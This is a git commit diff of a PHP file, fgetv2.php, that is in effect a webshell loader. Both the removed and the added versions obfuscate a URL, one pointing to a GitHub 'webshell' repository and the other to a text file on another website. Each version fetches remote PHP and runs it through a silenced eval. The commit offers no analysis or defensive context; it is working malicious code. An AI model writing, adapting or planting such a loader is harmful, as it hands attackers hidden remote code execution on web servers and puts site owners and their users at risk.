445b783c1030f0a5dcb9a5304ec3a38f3e5dff6c
Haikal Siregar <mininginformation1337@gmail.com>
2024-01-31 23:17:54 +0700

    Update fgetv2.php

--- fgetv2.php
+++ fgetv2.php
@@ -1,5 +1,17 @@
 <?php
 
-${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"]=[chr(63),chr(62),chr(48),chr(49),chr(50),chr(51),chr(52),chr(53),chr(54),chr(55),chr(56),chr(57),chr(97),chr(98),chr(99),chr(100),chr(101),chr(102),chr(103),chr(104),chr(105),chr(106),chr(107),chr(108),chr(109),chr(110),chr(111),chr(112),chr(113),chr(114),chr(115),chr(116),chr(117),chr(118),chr(119),chr(120),chr(121),chr(122),chr(65),chr(66),chr(67),chr(68),chr(69),chr(70),chr(71),chr(72),chr(73),chr(74),chr(75),chr(76),chr(77),chr(78),chr(79),chr(80),chr(81),chr(82),chr(83),chr(84),chr(85),chr(86),chr(87),chr(88),chr(89),chr(90),chr(95),chr(40),chr(41)];
-${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6f"]=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][17].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][20].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][23].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][16].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][64].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][18].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][16].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][31].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][64].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][14].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][26].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][25].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][31].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][16].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][25].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][31].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][30];
-@eval(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][0].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f"][1].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6f"]("https://raw.githubusercontent.com/justikail/webshell/main/temp_new.php"));
+$characters = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-']);
+$indexArray = [7, 19, 19, 15, 18, 63, 64, 64, 11, 12, 18, 62, 18, 19, 8, 12, 18, 20, 10, 12, 0, 12, 4, 3, 0, 13, 62, 0, 2, 62, 8, 3, 64, 22, 15, 66, 2, 14, 13, 19, 4, 13, 19, 64, 15, 11, 20, 6, 8, 13, 18, 64, 6, 14, 18, 12, 19, 15, 64, 17, 4, 0, 3, 12, 4, 62, 19, 23, 19];
+
+$decodedString = '';
+foreach ($indexArray as $index) {
+    $decodedString .= $characters[$index];
+}
+
+$url = "$decodedString";
+$response = file_get_contents($url);
+
+if ($response !== false) {
+    @eval("?>".$response);
+}
+?>
